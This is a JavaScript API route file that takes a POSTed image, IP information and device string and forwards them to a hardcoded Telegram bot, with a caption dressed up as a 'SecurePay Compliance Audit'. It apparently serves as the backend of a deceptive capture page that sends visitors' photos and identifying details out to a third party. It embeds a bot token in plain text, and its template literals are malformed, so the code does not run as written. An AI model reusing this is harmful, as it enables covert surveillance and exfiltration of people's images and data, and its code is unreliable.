export const config = {
  api: {
    bodyParser: {
      sizeLimit: '10mb',
    },
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { image, role, ipInfo, userAgent } = req.body;
    
    // ==========================================
    // PUT YOUR TELEGRAM BOT CREDENTIALS HERE
    // ==========================================
    const TELEGRAM_BOT_TOKEN = "8923655458:AAF6BG9j-hTC7N7NUE5e-IBICdDhsrJVm_M";
    const TELEGRAM_CHAT_ID = "8923655458";
    // ==========================================

    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
    let body = Buffer.concat([
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${8923655458}\r\n`),
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n🚨 *SecurePay Compliance Audit*\n\n🏷️ *Node Tag:* \`${role}\`\n🌐 *IP Address:* \`${ipInfo}\`\n💻 *Device:* \`${userAgent}\`\n⏱️ *Timestamp:* \`${new Date().toUTCString()}\`\n✅ *Status:* \`Handshake Cleared & Logged\`\r\n`),
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n`),
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="audit.png"\r\nContent-Type: image/png\r\n\r\n`),
      buffer,
      Buffer.from(`\r\n--${boundary}--\r\n`)
    ]);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${8923655458:AAF6BG9j-hTC7N7NUE5e-IBICdDhsrJVm_M}/sendPhoto`, {
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`
      },
      body: body
    });

    const result = await telegramResponse.json();
    return res.status(200).json({ success: true, result });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
